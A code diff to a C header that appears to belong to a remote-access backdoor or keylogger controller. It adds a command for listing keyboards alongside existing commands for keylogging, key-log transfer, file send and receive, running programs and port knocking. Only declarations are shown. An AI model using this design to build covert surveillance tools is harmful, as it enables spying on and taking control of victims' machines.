@@ -3,6 +3,7 @@
 
 #include <stddef.h>
 #include <stdint.h>
+#include <stdbool.h>
 
 #define COMMAND_TRIGGER_THRESHOLD 2
 #define RECEIVING_PORT 8080
@@ -16,6 +17,7 @@ enum command_codes {
     START_KEYLOGGER = 0x01,
     STOP_KEYLOGGER,
     KEY_LOG_TRANSFER,
+    GET_KEYBOARDS,
     SEND_FILE,
     FILENAME,
     RECEIVE_FILE,
@@ -67,6 +69,7 @@ void process_run_command(struct session_info * session_info);
 void process_receive_file(struct session_info * session_info);
 void process_send_file(struct session_info * session_info);
 void handle_response(struct session_info * session_info);
+void handle_get_keyboards(struct session_info * session_info);
 void handle_disconnect(struct session_info * session_info);
 
 //  Map of command codes and handler functions
@@ -76,6 +79,7 @@ static const key_pair command_handler_functions[] = {
     { RUN_PROGRAM, process_run_command },
     { SEND_FILE, process_send_file },
     { RECEIVE_FILE, process_receive_file },
+    { GET_KEYBOARDS, handle_get_keyboards },
     { DISCONNECT, handle_disconnect },
     { RESPONSE, handle_response },
     { 0, NULL }
@@ -84,8 +88,9 @@ static const key_pair command_handler_functions[] = {
 void initiate_port_knocking(const struct server_options * server_options);
 
 // Keylogger
-void send_start_keylogger(int fd);
-void send_stop_keylogger(int fd);
+void send_start_keylogger(struct server_options * server_options);
+void send_get_keyboards(struct server_options * server_options);
+void send_stop_keylogger(struct server_options * server_options);
 
 // Disconnect
 void send_disconnect(struct server_options * server_options);
